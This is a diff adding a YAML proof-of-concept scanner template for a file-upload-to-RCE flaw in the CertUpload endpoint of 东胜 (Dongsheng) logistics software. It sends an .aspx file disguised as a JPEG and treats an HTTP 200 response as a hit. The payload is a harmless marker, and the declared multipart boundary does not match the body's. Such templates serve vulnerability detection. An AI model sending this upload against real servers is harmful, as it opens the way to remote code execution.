@@ -1,0 +1,35 @@
+id:
+
+info:
+  name: 东胜物流软件 CertUpload 文件上传致RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /MsWlTruck/CertUpload
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
+  data: |
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+    Content-Disposition: form-data; name="file"; filename="test221.aspx"
+    Content-Type: image/jpeg
+
+    123456
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+    Content-Disposition: form-data; name="TruckNo";
+
+    1
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+    Content-Disposition: form-data; name="Cert_Type";
+
+    1
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+response1:
+  headers:
+  body: true
+  code: 200
+requests2:
+response2:
